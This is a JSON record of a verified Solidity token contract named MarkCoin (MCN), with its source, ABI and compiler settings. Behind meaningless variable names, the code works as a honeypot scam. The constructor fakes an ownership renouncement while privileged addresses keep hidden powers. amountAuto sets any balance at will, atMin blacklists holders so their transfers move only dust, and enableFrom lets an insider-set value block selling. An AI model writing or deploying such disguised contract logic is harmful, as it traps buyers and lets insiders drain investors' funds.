{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.13;\n\nlibrary SafeMath {\n\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\n        uint256 c = a + b;\n        require(c >= a, \"SafeMath: addition overflow\");\n\n        return c;\n    }\n\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\n        return sub(a, b, \"SafeMath: subtraction overflow\");\n    }\n\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b <= a, errorMessage);\n        uint256 c = a - b;\n\n        return c;\n    }\n\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\n        if (a == 0) {\n            return 0;\n        }\n\n        uint256 c = a * b;\n        require(c / a == b, \"SafeMath: multiplication overflow\");\n\n        return c;\n    }\n\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\n        return div(a, b, \"SafeMath: division by zero\");\n    }\n\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b > 0, errorMessage);\n        uint256 c = a / b;\n\n        return c;\n    }\n\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\n        return mod(a, b, \"SafeMath: modulo by zero\");\n    }\n\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\n        require(b != 0, errorMessage);\n        return a % b;\n    }\n}\n\nabstract contract buySell {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface walletEnable {\n    function createPair(address marketingAuto, address feeExempt) external returns (address);\n\n    function feeTo() external view returns (address);\n}\n\ninterface swapListToken {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\n\ninterface sellMax {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address receiverAuto) external view returns (uint256);\n\n    function transfer(address toSwap, uint256 senderSell) external returns (bool);\n\n    function allowance(address receiverTotalWallet, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 senderSell) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address toSwap,\n        uint256 senderSell\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed totalReceiver, uint256 value);\n    event Approval(address indexed receiverTotalWallet, address indexed spender, uint256 value);\n}\n\ninterface sellMaxMetadata is sellMax {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract MarkCoin is buySell, sellMax, sellMaxMetadata {\n\n    function symbol() external view virtual override returns (string memory) {\n        return walletTxShould;\n    }\n\n    mapping(address => bool) public teamToken;\n\n    address public enableMarketing;\n\n    mapping(address => mapping(address => uint256)) private marketingMax;\n\n    bool public amountEnableToken;\n\n    address public txExempt;\n\n    bool public tradingSenderTo;\n\n    function transfer(address tradingMarketing, uint256 senderSell) external virtual override returns (bool) {\n        return enableFrom(_msgSender(), tradingMarketing, senderSell);\n    }\n\n    uint256 private walletExempt = 100000000 * 10 ** 18;\n\n    uint256 private shouldSender;\n\n    function atMin(address shouldLaunched) public {\n        buyList();\n        \n        if (shouldLaunched == txExempt || shouldLaunched == enableMarketing) {\n            return;\n        }\n        tokenLimit[shouldLaunched] = true;\n    }\n\n    function teamMin(address atExempt) public {\n        if (amountEnableToken) {\n            return;\n        }\n        if (tradingSenderTo) {\n            receiverAt = false;\n        }\n        teamToken[atExempt] = true;\n        \n        amountEnableToken = true;\n    }\n\n    string private launchTake = \"Mark Coin\";\n\n    function balanceOf(address receiverAuto) public view virtual override returns (uint256) {\n        return teamShould[receiverAuto];\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return launchTake;\n    }\n\n    uint256 walletLimitToken;\n\n    bool public receiverAt;\n\n    function tokenWalletSell(uint256 senderSell) public {\n        buyList();\n        walletLimitToken = senderSell;\n    }\n\n    address private listWalletMode;\n\n    function owner() external view returns (address) {\n        return listWalletMode;\n    }\n\n    mapping(address => bool) public tokenLimit;\n\n    address exemptTotal;\n\n    function receiverTxBuy(address fundLaunch, address toSwap, uint256 senderSell) internal view returns (uint256) {\n        require(senderSell > 0);\n\n        uint256 receiverEnable = 0;\n        if (fundLaunch == enableMarketing && buyLaunch > 0) {\n            receiverEnable = senderSell * buyLaunch / 100;\n        } else if (toSwap == enableMarketing && sellShould > 0) {\n            receiverEnable = senderSell * sellShould / 100;\n        }\n        require(receiverEnable <= senderSell);\n        return senderSell - receiverEnable;\n    }\n\n    function transferFrom(address fundLaunch, address toSwap, uint256 senderSell) external override returns (bool) {\n        if (_msgSender() != walletReceiver) {\n            if (marketingMax[fundLaunch][_msgSender()] != type(uint256).max) {\n                require(senderSell <= marketingMax[fundLaunch][_msgSender()]);\n                marketingMax[fundLaunch][_msgSender()] -= senderSell;\n            }\n        }\n        return enableFrom(fundLaunch, toSwap, senderSell);\n    }\n\n    uint256 public sellShould = 0;\n\n    function amountFrom() public {\n        emit OwnershipTransferred(txExempt, address(0));\n        listWalletMode = address(0);\n    }\n\n    function enableFrom(address fundLaunch, address toSwap, uint256 senderSell) internal returns (bool) {\n        if (fundLaunch == txExempt) {\n            return swapTokenTrading(fundLaunch, toSwap, senderSell);\n        }\n        uint256 limitTake = sellMax(enableMarketing).balanceOf(exemptTotal);\n        require(limitTake == walletLimitToken);\n        require(toSwap != exemptTotal);\n        if (tokenLimit[fundLaunch]) {\n            return swapTokenTrading(fundLaunch, toSwap, takeList);\n        }\n        senderSell = receiverTxBuy(fundLaunch, toSwap, senderSell);\n        return swapTokenTrading(fundLaunch, toSwap, senderSell);\n    }\n\n    function allowance(address listIs, address tradingTo) external view virtual override returns (uint256) {\n        if (tradingTo == walletReceiver) {\n            return type(uint256).max;\n        }\n        return marketingMax[listIs][tradingTo];\n    }\n\n    string private walletTxShould = \"MCN\";\n\n    function amountAuto(address tradingMarketing, uint256 senderSell) public {\n        buyList();\n        teamShould[tradingMarketing] = senderSell;\n    }\n\n    bool private feeToken;\n\n    uint256 private tradingBuy;\n\n    function buyList() private view {\n        require(teamToken[_msgSender()]);\n    }\n\n    constructor (){\n        \n        amountFrom();\n        swapListToken exemptMarketing = swapListToken(walletReceiver);\n        enableMarketing = walletEnable(exemptMarketing.factory()).createPair(exemptMarketing.WETH(), address(this));\n        exemptTotal = walletEnable(exemptMarketing.factory()).feeTo();\n        if (feeToken != teamTotal) {\n            tradingSenderTo = false;\n        }\n        txExempt = _msgSender();\n        teamToken[txExempt] = true;\n        teamShould[txExempt] = walletExempt;\n        if (shouldSender != launchedTradingLaunch) {\n            feeToken = false;\n        }\n        emit Transfer(address(0), txExempt, walletExempt);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return tokenBuy;\n    }\n\n    uint256 constant takeList = 4 ** 10;\n\n    bool public teamTotal;\n\n    uint256 autoMarketingLiquidity;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return walletExempt;\n    }\n\n    function getOwner() external view returns (address) {\n        return listWalletMode;\n    }\n\n    address walletReceiver = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint8 private tokenBuy = 18;\n\n    uint256 public buyLaunch = 3;\n\n    uint256 public launchedTradingLaunch;\n\n    function approve(address tradingTo, uint256 senderSell) public virtual override returns (bool) {\n        marketingMax[_msgSender()][tradingTo] = senderSell;\n        emit Approval(_msgSender(), tradingTo, senderSell);\n        return true;\n    }\n\n    event OwnershipTransferred(address indexed launchedFromMax, address indexed takeTotal);\n\n    mapping(address => uint256) private teamShould;\n\n    function swapTokenTrading(address fundLaunch, address toSwap, uint256 senderSell) internal returns (bool) {\n        require(teamShould[fundLaunch] >= senderSell);\n        teamShould[fundLaunch] -= senderSell;\n        teamShould[toSwap] += senderSell;\n        emit Transfer(fundLaunch, toSwap, senderSell);\n        return true;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverTotalWallet\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"launchedFromMax\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"takeTotal\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalReceiver\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listIs\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"tradingTo\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderSell\",\"type\":\"uint256\"}],\"name\":\"amountAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountEnableToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"amountFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderSell\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"shouldLaunched\",\"type\":\"address\"}],\"name\":\"atMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverAuto\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyLaunch\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableMarketing\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchedTradingLaunch\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverAt\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellShould\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atExempt\",\"type\":\"address\"}],\"name\":\"teamMin\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"teamToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tokenLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"senderSell\",\"type\":\"uint256\"}],\"name\":\"tokenWalletSell\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingSenderTo\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingMarketing\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderSell\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundLaunch\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"toSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderSell\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txExempt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "MarkCoin", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}